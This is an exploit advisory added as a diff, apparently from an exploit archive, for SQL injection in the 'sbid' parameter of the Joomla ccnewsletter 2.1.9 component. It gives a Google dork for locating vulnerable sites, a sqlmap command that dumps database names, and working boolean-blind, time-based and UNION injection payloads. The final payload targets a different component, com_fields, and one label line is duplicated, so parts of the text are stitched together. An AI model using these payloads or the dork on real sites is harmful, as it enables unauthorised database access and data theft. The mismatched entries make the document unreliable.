@@ -1,0 +1,44 @@
+"Joomla Component ccnewsletter 2.1.9 - 'sbid' Parameter SQL Injection"
+
+
+# Exploit Title: Joomla Component ccnewsletter 2.1.9 - SQL Injection
+# Date: 07-26-2017
+# Exploit Author: Shahab Shamsi
+# Vendor Homepage: https://extensions.joomla.org/extension/ccnewsletter/
+# Version: = 2.1.9 [Final Version]
+# Tested on: Win,Linux
+# Google Dork: inurl:"index.php?option=com_ccnewsletter" inurl:sbid
+# Video Refrence: http://securityman.org/joomla-component-ccnewsletter-2-1-9-sql-injection/
+ 
+ 
+
+ 
+Sqlmap: 
+ 
+sqlmap -u "http://Target/index.php?option=com_ccnewsletter&view=detail&id=73&sbid=[SQL]&tmpl=newsletter" -p sbid --dbs
+ 
+
+
+
+Testing Method:
+  - boolean-based blind
+  - time-based blind
+  - UNION query
+
+
+
+Parameter: sbid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: option=com_ccnewsletter&view=detail&id=73&sbid=185 AND 3881=3881&tmpl=newsletter
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: option=com_ccnewsletter&view=detail&id=73&sbid=185 AND SLEEP(5)&tmpl=newsletter
+    Type: AND/OR time-based blind
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 10 columns
+    Payload: option=com_ccnewsletter&view=detail&id=73&sbid=-3094 UNION ALL SELECT NULL,NULL,CONCAT(0x7162626a71,0x4357474c4d556472646b43704f44476e64694f6a6d6d6873795552656d5446767846466e63677974,0x71766b6a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CCQB&tmpl=newsletter
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
